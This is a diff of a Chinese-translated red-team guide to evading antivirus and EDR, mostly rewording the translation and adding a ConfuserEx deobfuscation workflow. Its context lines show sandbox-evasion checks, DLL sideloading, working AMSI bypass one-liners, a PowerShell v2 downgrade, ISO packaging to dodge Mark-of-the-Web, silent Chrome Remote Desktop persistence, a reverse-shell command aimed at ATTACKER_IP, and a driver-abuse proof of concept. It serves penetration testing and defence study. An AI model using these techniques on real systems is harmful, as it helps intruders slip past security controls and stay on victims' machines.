@@ -16,7 +16,7 @@
 
 ### **静态检测**
 
-静态检测是通过标记二进制文件或脚本中的已知恶意字符串或字节数组来实现的，同时还提取文件本身的信息（例如，文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：
+静态检测是通过标记已知的恶意字符串或字节数组在二进制文件或脚本中实现的，同时还提取文件本身的信息（例如，文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：
 
 - **加密**
 
@@ -40,18 +40,18 @@
 动态分析是指 AV 在沙箱中运行你的二进制文件并监视恶意活动（例如，尝试解密并读取浏览器的密码，对 LSASS 进行小型转储等）。这一部分可能更难处理，但这里有一些你可以做的事情来规避沙箱。
 
 - **执行前休眠** 根据实现方式，这可能是绕过 AV 动态分析的好方法。AV 扫描文件的时间非常短，以免打断用户的工作流程，因此使用长时间的休眠可以干扰二进制文件的分析。问题是许多 AV 的沙箱可能会根据实现方式跳过休眠。
-- **检查机器资源** 通常沙箱可用的资源非常少（例如，< 2GB RAM），否则它们可能会减慢用户的机器。你也可以在这里发挥创造力，例如检查 CPU 的温度或风扇速度，并不是所有内容都会在沙箱中实现。
+- **检查机器资源** 通常沙箱可用的资源非常少（例如，< 2GB RAM），否则可能会减慢用户的机器。你也可以在这里发挥创造力，例如检查 CPU 温度或风扇速度，并不是所有内容都会在沙箱中实现。
 - **特定机器检查** 如果你想针对加入“contoso.local”域的用户的工作站，你可以检查计算机的域是否与指定的匹配，如果不匹配，你可以让程序退出。
 
-事实证明，Microsoft Defender 的沙箱计算机名是 HAL9TH，因此，你可以在恶意软件引爆前检查计算机名称，如果名称匹配 HAL9TH，则意味着你在 Defender 的沙箱中，因此可以让程序退出。
+事实证明，Microsoft Defender 的沙箱计算机名是 HAL9TH，因此，你可以在恶意软件中检查计算机名称，如果名称匹配 HAL9TH，则意味着你在 Defender 的沙箱中，因此可以让程序退出。
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>来源: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-一些来自 [@mgeeky](https://twitter.com/mariuszbit) 的非常好的针对沙箱的建议
+一些来自 [@mgeeky](https://twitter.com/mariuszbit) 的非常好的建议，用于对抗沙箱
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>
 
-正如我们在这篇文章中之前所说，**公共工具**最终会被 **检测到**，所以你应该问自己一个问题：
+正如我们在这篇文章中之前所说的，**公共工具**最终会被 **检测到**，所以你应该问自己一个问题：
 
 例如，如果你想转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你可以使用一个不太知名的项目来转储 LSASS。
 
@@ -66,13 +66,13 @@
 
 正如我们在这张图片中看到的，Havoc 的 DLL 有效载荷在 antiscan.me 上的检测率为 4/26，而 EXE 有效载荷的检测率为 7/26。
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 上普通 Havoc EXE 有效载荷与普通 Havoc DLL 的比较</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 上正常 Havoc EXE 有效载荷与正常 Havoc DLL 的比较</p></figcaption></figure>
 
 现在我们将展示一些你可以使用 DLL 文件的技巧，以便更加隐蔽。
 
 ## DLL 侧载与代理
 
-**DLL 侧载** 利用加载器使用的 DLL 搜索顺序，通过将受害者应用程序和恶意有效载荷并排放置来实现。
+**DLL 侧载** 利用加载程序使用的 DLL 搜索顺序，通过将受害者应用程序和恶意有效载荷并排放置来实现。
 
 你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 PowerShell 脚本检查易受 DLL 侧载攻击的程序：
 ```bash
@@ -85,7 +85,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 我强烈建议您**自己探索可DLL劫持/侧载的程序**，如果正确执行，这种技术相当隐蔽，但如果您使用公开已知的DLL侧载程序，可能会很容易被抓住。
 
-仅仅放置一个名称为程序期望加载的恶意DLL，并不会加载您的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种称为**DLL代理/转发**的技术。
+仅仅放置一个名称与程序期望加载的恶意DLL并不会加载您的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。
 
 **DLL代理**将程序从代理（和恶意）DLL发出的调用转发到原始DLL，从而保留程序的功能并能够处理您的有效载荷的执行。
 
@@ -106,12 +106,12 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我认为这是一个成功。
+我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我认为这算是成功。
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> 我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们讨论的内容。
+> 我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE) 以更深入地了解我们讨论的内容。
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
@@ -127,11 +127,11 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> 规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能，尝试将多个规避技术结合起来。
+> 规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能，尝试将多个规避技术结合使用。
 
 ## AMSI（反恶意软件扫描接口）
 
-AMSI的创建是为了防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless_malware)”。最初，AV只能扫描**磁盘上的文件**，因此如果你能够以某种方式**直接在内存中**执行有效载荷，AV就无法采取任何措施来阻止，因为它没有足够的可见性。
+AMSI的创建是为了防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless_malware)”。最初，AV只能扫描**磁盘上的文件**，因此如果你能够以某种方式**直接在内存中**执行有效载荷，AV就无法采取任何措施来阻止它，因为它没有足够的可见性。
 
 AMSI功能集成在Windows的以下组件中。
 
@@ -159,7 +159,7 @@ AMSI功能集成在Windows的以下组件中。
 
 由于AMSI主要依赖静态检测，因此修改你尝试加载的脚本可能是规避检测的好方法。
 
-然而，AMSI有能力解混淆脚本，即使它有多层，因此混淆可能是一个糟糕的选择，这取决于它的实现方式。这使得规避变得不那么简单。不过，有时你只需要更改几个变量名称就可以了，所以这取决于某个内容被标记的程度。
+然而，AMSI有能力解混淆脚本，即使它有多层，因此混淆可能是一个糟糕的选择，具体取决于其实现方式。这使得规避变得不那么简单。不过，有时你只需要更改几个变量名称就可以了，所以这取决于某个内容被标记的程度。
 
 - **AMSI绕过**
 
@@ -167,11 +167,11 @@ AMSI功能集成在Windows的以下组件中。
 
 **强制错误**
 
-强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初这是由[Matt Graeber](https://twitter.com/mattifestation)披露的，微软已经开发了一个签名以防止更广泛的使用。
+强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初这是由[Matt Graeber](https://twitter.com/mattifestation)披露的，微软已经开发了一种签名来防止更广泛的使用。
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-只需一行 PowerShell 代码就可以使当前 PowerShell 进程无法使用 AMSI。 当然，这一行已经被 AMSI 本身标记，因此需要进行一些修改才能使用此技术。
+只需一行 PowerShell 代码就可以使当前 PowerShell 进程的 AMSI 无法使用。 当然，这一行已经被 AMSI 本身标记，因此需要进行一些修改才能使用此技术。
 
 这是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改过的 AMSI 绕过方法。
 ```bash
@@ -191,25 +191,26 @@ $Spotfix.SetValue($null,$true)
 
 **内存补丁**
 
-该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，涉及在 amsi.dll 中找到 "AmsiScanBuffer" 函数的地址（负责扫描用户提供的输入），并用返回 E_INVALIDARG 代码的指令覆盖它，这样，实际扫描的结果将返回 0，这被解释为干净的结果。
+该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，它涉及在 amsi.dll 中找到 "AmsiScanBuffer" 函数的地址（负责扫描用户提供的输入），并用返回 E_INVALIDARG 代码的指令覆盖它，这样，实际扫描的结果将返回 0，这被解释为干净的结果。
 
 > [!TIP]
 > 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的解释。
 
 还有许多其他技术用于通过 PowerShell 绕过 AMSI，查看 [**此页面**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**此仓库**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多信息。
 
-该工具 [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) 还生成脚本以绕过 AMSI。
+这个工具 [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) 也生成脚本以绕过 AMSI。
 
 **移除检测到的签名**
 
-您可以使用工具 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程的内存以查找 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。
+你可以使用工具 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程的内存以查找 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。
 
 **使用 AMSI 的 AV/EDR 产品**
 
-您可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。
+你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。
 
 **使用 PowerShell 版本 2**
-如果您使用 PowerShell 版本 2，AMSI 将不会被加载，因此您可以在不被 AMSI 扫描的情况下运行脚本。您可以这样做：
+
+如果你使用 PowerShell 版本 2，AMSI 将不会被加载，因此你可以在不被 AMSI 扫描的情况下运行你的脚本。你可以这样做：
 ```bash
 powershell.exe -version 2
 ```
@@ -226,39 +227,73 @@ PowerShell logging 是一个功能，允许您记录系统上执行的所有 Pow
 ## Obfuscation
 
 > [!TIP]
-> 几种混淆技术依赖于加密数据，这将增加二进制文件的熵，从而使 AV 和 EDR 更容易检测到它。对此要小心，可能只对您代码中敏感或需要隐藏的特定部分应用加密。
+> 几种混淆技术依赖于加密数据，这将增加二进制文件的熵，从而使 AV 和 EDR 更容易检测到它。对此要小心，也许只对您代码中敏感或需要隐藏的特定部分应用加密。
 
-有几种工具可以用来**混淆 C# 明文代码**，生成**元编程模板**以编译二进制文件或**混淆已编译的二进制文件**，例如：
+### Deobfuscating ConfuserEx-Protected .NET Binaries
 
-- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx)：这是一个很好的开源混淆器，用于 .NET 应用程序。它提供多种保护技术，如控制流混淆、反调试、反篡改和字符串加密。推荐使用，因为它甚至允许混淆特定的代码块。
-- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# 混淆器**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator)：该项目的目的是提供一个开源的 LLVM 编译套件分支，能够通过 [代码混淆](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改提供增强的软件安全性。
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator)：ADVobfuscator 演示了如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具且不修改编译器。
-- [**obfy**](https://github.com/fritzone/obfy)：添加一层由 C++ 模板元编程框架生成的混淆操作，这将使想要破解应用程序的人稍微困难一些。
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**：Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe、.dll、.sys
-- [**metame**](https://github.com/a0rtega/metame)：Metame 是一个简单的变形代码引擎，适用于任意可执行文件。
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator)：ROPfuscator 是一个细粒度的代码混淆框架，适用于使用 ROP（面向返回的编程）的 LLVM 支持语言。ROPfuscator 通过将常规指令转换为 ROP 链，在汇编代码级别混淆程序，阻碍我们对正常控制流的自然概念。
-- [**Nimcrypt**](https://github.com/icyguider/nimcrypt)：Nimcrypt 是一个用 Nim 编写的 .NET PE 加密工具。
-- [**inceptor**](https://github.com/klezVirus/inceptor)**：Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们。
+在分析使用 ConfuserEx 2（或商业分支）的恶意软件时，通常会面临多个保护层，这些保护层会阻止反编译器和沙箱。以下工作流程可靠地**恢复接近原始 IL**，之后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。
+
+1.  反篡改移除 – ConfuserEx 加密每个 *方法体* 并在 *模块* 静态构造函数 (`<Module>.cctor`) 内解密。这还会修补 PE 校验和，因此任何修改都会导致二进制文件崩溃。使用 **AntiTamperKiller** 定位加密的元数据表，恢复 XOR 密钥并重写干净的程序集：
+```bash
+# https://github.com/wwh1004/AntiTamperKiller
+python AntiTamperKiller.py Confused.exe Confused.clean.exe
+```
+输出包含 6 个反篡改参数（`key0-key3`，`nameHash`，`internKey`），在构建自己的解包器时可能会有用。
+
+2.  符号 / 控制流恢复 – 将 *干净* 文件输入 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
+```bash
+de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
+```
+标志：
+• `-p crx` – 选择 ConfuserEx 2 配置文件
+• de4dot 将撤销控制流扁平化，恢复原始命名空间、类和变量名称，并解密常量字符串。
+
+3.  代理调用剥离 – ConfuserEx 用轻量级包装器（即 *代理调用*）替换直接方法调用，以进一步破坏反编译。使用 **ProxyCall-Remover** 移除它们：
+```bash
+ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
+```
+在此步骤之后，您应该观察到正常的 .NET API，如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的包装函数（`Class8.smethod_10`，…）。
+
+4.  手动清理 – 在 dnSpy 下运行结果二进制文件，搜索大型 Base64 块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位 *真实* 有效负载。恶意软件通常将其存储为在 `<Module>.byte_0` 内初始化的 TLV 编码字节数组。
+
+上述链条在**不需要**运行恶意样本的情况下恢复执行流 – 在离线工作站上工作时非常有用。
+
+> 🛈  ConfuserEx 生成一个名为 `ConfusedByAttribute` 的自定义属性，可以用作 IOC 来自动分类样本。
+
+#### One-liner
+```bash
+autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
+```
+---
+
+- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供一个开源的 LLVM 编译套件分支，能够通过 [代码混淆](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提高软件安全性。
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示了如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具和修改编译器。
+- [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ 模板元编程框架生成的混淆操作，这将使想要破解应用程序的人稍微困难一些。
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe, .dll, .sys
+- [**metame**](https://github.com/a0rtega/metame): Metame 是一个简单的变形代码引擎，适用于任意可执行文件。
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM 支持语言的细粒度代码混淆框架，使用 ROP（面向返回的编程）。ROPfuscator 通过将常规指令转换为 ROP 链，在汇编代码级别混淆程序，阻碍我们对正常控制流的自然理解。
+- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个用 Nim 编写的 .NET PE 加密器
+- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们
 
 ## SmartScreen & MoTW
 
 您可能在从互联网下载某些可执行文件并执行时见过此屏幕。
 
-Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户免受运行潜在恶意应用程序的影响。
+Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户免受潜在恶意应用程序的影响。
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
 SmartScreen 主要采用基于声誉的方法，这意味着不常下载的应用程序将触发 SmartScreen，从而警告并阻止最终用户执行该文件（尽管用户仍然可以通过点击更多信息 -> 无论如何运行来执行该文件）。
 
-**MoTW**（网络标记）是一个 [NTFS 备用数据流](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，其名称为 Zone.Identifier，下载来自互联网的文件时会自动创建，并附带下载的 URL。
+**MoTW**（网络标记）是一个 [NTFS 备用数据流](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，其名称为 Zone.Identifier，下载自互联网的文件时会自动创建，并附带下载的 URL。
 
 <figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>
 
 > [!TIP]
-> 重要的是要注意，使用**受信任**签名证书签名的可执行文件**不会触发 SmartScreen**。
+> 重要的是要注意，使用 **受信任** 签名证书签名的可执行文件 **不会触发 SmartScreen**。
 
-防止您的有效载荷获得网络标记的一个非常有效的方法是将它们打包在某种容器中，例如 ISO。这是因为网络标记（MOTW）**不能**应用于**非 NTFS** 卷。
+防止您的有效载荷获得网络标记的一个非常有效的方法是将它们打包在某种容器中，例如 ISO。这是因为网络标记（MOTW） **不能** 应用于 **非 NTFS** 卷。
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
@@ -325,9 +360,9 @@ Windows 事件跟踪 (ETW) 是 Windows 中一种强大的日志记录机制，�
 
 ## 使用其他编程语言
 
-正如在 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中提出的，可以通过让受损机器访问 **安装在攻击者控制的 SMB 共享上的解释器环境** 来使用其他语言执行恶意代码。
+正如在 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中提出的，可以通过让被攻陷的机器访问 **安装在攻击者控制的 SMB 共享上的解释器环境** 来使用其他语言执行恶意代码。
 
-通过允许访问 SMB 共享上的解释器二进制文件和环境，您可以 **在受损机器的内存中执行这些语言的任意代码**。
+通过允许访问 SMB 共享上的解释器二进制文件和环境，您可以 **在被攻陷机器的内存中执行这些语言的任意代码**。
 
 该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等，我们有 **更多灵活性来绕过静态签名**。使用这些语言中的随机未混淆反向 shell 脚本进行测试已证明成功。
 
@@ -345,7 +380,7 @@ Token stomping 是一种技术，允许攻击者 **操纵访问令牌或安全�
 
 ### Chrome 远程桌面
 
-正如在 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 中所述，轻松地在受害者的 PC 上部署 Chrome 远程桌面，然后使用它接管并保持持久性：
+正如在 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 中所述，简单地在受害者的 PC 上部署 Chrome 远程桌面，然后使用它接管并保持持久性是很容易的：
 1. 从 https://remotedesktop.google.com/ 下载，点击“通过 SSH 设置”，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
 2. 在受害者机器上静默运行安装程序 (需要管理员权限)：`msiexec /i chromeremotedesktophost.msi /qn`
 3. 返回 Chrome 远程桌面页面并点击下一步。向导将要求您授权；点击授权按钮继续。
@@ -449,7 +484,7 @@ https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-使用它与：
+与之一起使用：
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -609,7 +644,7 @@ sc start  ServiceMouse
 | `0x990000D0` | 删除磁盘上的任意文件 |
 | `0x990001D0` | 卸载驱动程序并移除服务 |
 
-最小 C 概念验证：
+最小 C 证明概念：
 ```c
 #include <windows.h>
 
@@ -662,13 +697,14 @@ f.write(replacement)
 
 * **所有** 姿态检查显示 **绿色/合规**。
 * 未签名或修改的二进制文件可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
-* 被攻陷的主机获得了对 Zscaler 政策定义的内部网络的无限制访问。
+* 被攻陷的主机获得对 Zscaler 策略定义的内部网络的无限制访问。
 
 这个案例研究展示了如何通过简单的客户端信任决策和简单的签名检查被几个字节的补丁击败。
 
 ## 参考文献
 
+- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
-
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+
 {{#include ../banners/hacktricks-training.md}}
